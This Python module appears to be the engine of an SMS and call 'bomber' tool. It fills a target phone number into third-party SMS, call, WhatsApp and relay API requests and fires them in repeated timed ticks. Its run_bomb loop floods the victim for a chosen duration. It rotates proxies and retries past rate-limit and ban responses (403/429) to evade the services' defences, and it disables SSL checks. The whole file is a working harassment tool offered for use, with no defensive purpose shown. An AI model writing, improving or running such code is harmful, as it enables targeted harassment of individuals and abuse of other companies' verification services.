import asyncio
import json
import logging
import time
from pathlib import Path
from typing import Optional
from urllib.parse import urlparse
import aiohttp

from db import (
    seed_api_stats, mark_api_success, mark_api_fail,
    healthy_apis, get_api_health,
)
import proxies
from config import (
    BOMB_TICK_SECONDS, GLOBAL_CONCURRENCY, PER_HOST_CONCURRENCY,
    REQUEST_TIMEOUT, MAX_RETRIES, HOT_POOL_SIZE,
)

log = logging.getLogger("bomber")

APIS_FILE = Path("apis.json")
TICK_SECONDS = BOMB_TICK_SECONDS
GLOBAL_CONCURRENCY = GLOBAL_CONCURRENCY
GLOBAL_CONCURRENCY = 60
PER_HOST_CONCURRENCY = 3
REQUEST_TIMEOUT = 6.0
MAX_RETRIES = 2

_apis: list[dict] = []
_api_index: dict[str, dict] = {}
_global_sem: Optional[asyncio.Semaphore] = None
_host_sems: dict[str, asyncio.Semaphore] = {}
_session: Optional[aiohttp.ClientSession] = None
_connector: Optional[aiohttp.TCPConnector] = None

# Hot API pool: maintain ~5 healthy APIs, rotated per tick
_hot_pool: dict[str, list[dict]] = {}  # category -> list of api dicts
_hot_lock: dict[str, asyncio.Lock] = {}  # category -> lock
HOT_POOL_SIZE = 5


async def init_bomber() -> None:
    global _apis, _api_index, _global_sem, _session, _connector
    raw = json.loads(APIS_FILE.read_text(encoding="utf-8"))
    _apis = raw["apis"]
    _api_index = {a["id"]: a for a in _apis}
    await seed_api_stats(_apis)
    _global_sem = asyncio.Semaphore(GLOBAL_CONCURRENCY)
    _connector = aiohttp.TCPConnector(
        limit=200, limit_per_host=10, ttl_dns_cache=300, ssl=False,
    )
    _session = aiohttp.ClientSession(
        connector=_connector,
        timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT),
    )
    log.info("bomber ready: %s apis", len(_apis))


async def close_bomber() -> None:
    global _session, _connector
    if _session:
        await _session.close()
        _session = None
    if _connector:
        await _connector.close()
        _connector = None


def _session_ref() -> aiohttp.ClientSession:
    if _session is None:
        raise RuntimeError("bomber not initialized")
    return _session


def _host_sem(host: str) -> asyncio.Semaphore:
    if host not in _host_sems:
        _host_sems[host] = asyncio.Semaphore(PER_HOST_CONCURRENCY)
    return _host_sems[host]


def _render(template: Optional[str], phone: str) -> Optional[str]:
    if template is None:
        return None
    return template.replace("{phone}", phone)


def _host_of(url: str) -> str:
    try:
        return urlparse(url).hostname or "unknown"
    except Exception:
        return "unknown"


def _classify(api: dict, status: int, body: str) -> bool:
    if status not in api.get("success_codes", [200, 201, 202]):
        return False
    keys = api.get("success_keys") or []
    if not keys:
        return True
    low = body.lower()
    return any(k.lower() in low for k in keys)


async def _ensure_hot_pool(category: str) -> list[dict]:
    """Ensure hot pool has up to HOT_POOL_SIZE healthy APIs for category."""
    if category not in _hot_lock:
        _hot_lock[category] = asyncio.Lock()
    async with _hot_lock[category]:
        pool = _hot_pool.get(category, [])
        # Remove failed/banned APIs if their health dropped
        pool = [a for a in pool if a.get("health_ok", True)]
        if len(pool) >= HOT_POOL_SIZE:
            _hot_pool[category] = pool[:HOT_POOL_SIZE]
            return pool[:HOT_POOL_SIZE]
        # Refill from DB
        db_apis = await healthy_apis(None if category == "all" else category)
        for s in db_apis:
            if len(pool) >= HOT_POOL_SIZE:
                break
            api = _api_index.get(s["api_id"])
            if not api or not api.get("enabled", True):
                continue
            api["health_ok"] = True
            pool.append(api)
        _hot_pool[category] = pool
        return pool


async def _evict_hot_pool_api(category: str, api_id: str) -> None:
    """Evict a failed API from the hot pool so it gets replaced next tick."""
    if category not in _hot_lock:
        _hot_lock[category] = asyncio.Lock()
    async with _hot_lock[category]:
        _hot_pool[category] = [a for a in _hot_pool.get(category, []) if a["id"] != api_id]


async def _fire(api: dict, phone: str, use_proxy: bool = True) -> bool:
    url = api["url"]
    host = _host_of(url)
    payload = _render(api.get("payload"), phone)
    headers = dict(api.get("headers") or {})
    method = api["method"].upper()

    proxy_url: Optional[str] = None
    if use_proxy:
        try:
            proxy_url = await proxies.pick_proxy(host)
        except Exception:
            proxy_url = None

    for attempt in range(MAX_RETRIES + 1):
        start = time.time()
        try:
            async with _global_sem:
                async with _host_sem(host):
                    if proxy_url:
                        req = _session_ref().request(
                            method, url, headers=headers,
                            data=payload if method != "GET" else None,
                            proxy=proxy_url, ssl=False,
                        )
                    else:
                        req = _session_ref().request(
                            method, url, headers=headers,
                            data=payload if method != "GET" else None,
                            ssl=False,
                        )
                    async with req as resp:
                        status = resp.status
                        try:
                            body = await resp.text()
                        except Exception:
                            body = ""
            latency = int((time.time() - start) * 1000)

            if status in (403, 429):
                await mark_api_fail(api["id"], status=status,
                                    backoff=60 if status == 429 else 30)
                try:
                    await proxies.report_ban(host, proxy_url)
                except Exception:
                    pass
                proxy_url = None
                if attempt < MAX_RETRIES:
                    continue
                return False

            if 200 <= status < 300 and _classify(api, status, body):
                await mark_api_success(api["id"], latency)
                try:
                    await proxies.report_success(host, proxy_url)
                except Exception:
                    pass
                return True

            await mark_api_fail(api["id"], status=status, backoff=15)
            if attempt < MAX_RETRIES:
                continue
            return False

        except asyncio.TimeoutError:
            await mark_api_fail(api["id"], status=None, backoff=20)
            try:
                await proxies.report_ban(host, proxy_url)
            except Exception:
                pass
            proxy_url = None
            if attempt < MAX_RETRIES:
                continue
            return False

        except Exception:
            await mark_api_fail(api["id"], status=None, backoff=10)
            if attempt < MAX_RETRIES:
                continue
            return False

    return False


async def _filter_apis(category: str, last_results: dict[str, bool],
                       resend_mode: bool) -> list[dict]:
    """Get up to HOT_POOL_SIZE healthy APIs from the hot pool, refreshing as needed."""
    pool = await _ensure_hot_pool(category)
    selected = []
    for api in pool:
        if resend_mode and last_results.get(api["id"]):
            continue
        selected.append(api)
    return selected


async def run_bomb(bomb_id: int, user_id: int, phone: str,
                   category: str, duration_sec: int, resend_mode: bool,
                   progress_cb=None) -> dict:
    start = time.time()
    end_at = start + duration_sec
    hits = 0
    fails = 0
    resends = 0
    last_results: dict[str, bool] = {}
    tick_no = 0

    log.info("bomb %s start phone=%s cat=%s dur=%s resend=%s",
             bomb_id, phone, category, duration_sec, resend_mode)

    while time.time() < end_at:
        tick_no += 1
        apis = await _filter_apis(category, last_results, resend_mode)
        if not apis:
            await asyncio.sleep(TICK_SECONDS)
            continue

        tasks = []
        for api in apis:
            tasks.append(_fire(api, phone, use_proxy=True))

        results = await asyncio.gather(*tasks, return_exceptions=True)

        for api, r in zip(apis, results):
            ok = (r is True)
            last_results[api["id"]] = ok
            if ok:
                hits += 1
                if resend_mode:
                    resends += 1
            else:
                fails += 1
                # Evict failed API from the hot pool so it gets replaced next tick
                try:
                    await _evict_hot_pool_api(category, api["id"])
                except Exception:
                    pass

        if progress_cb:
            try:
                await progress_cb({
                    "elapsed": int(time.time() - start),
                    "remaining": max(0, int(end_at - time.time())),
                    "hits": hits,
                    "fails": fails,
                    "tick": tick_no,
                    "apis_fired": len(apis),
                })
            except Exception:
                pass

        await asyncio.sleep(TICK_SECONDS)

    log.info("bomb %s done hits=%s fails=%s resends=%s dur=%ss",
             bomb_id, hits, fails, resends, int(time.time() - start))
    return {
        "hits": hits,
        "fails": fails,
        "resends": resends,
        "duration": int(time.time() - start),
        "ticks": tick_no,
    }


async def api_report() -> dict:
    apis = await healthy_apis()
    return {
        "total": len(_apis),
        "healthy": len(apis),
        "by_category": {
            c: sum(1 for a in apis if a["category"] == c)
            for c in ("sms", "call", "whatsapp", "relay")
        },
    }


async def reset_health_all() -> None:
    from db import reset_api_health
    await reset_api_health()


async def get_api_status(api_id: str) -> Optional[dict]:
    return await get_api_health(api_id)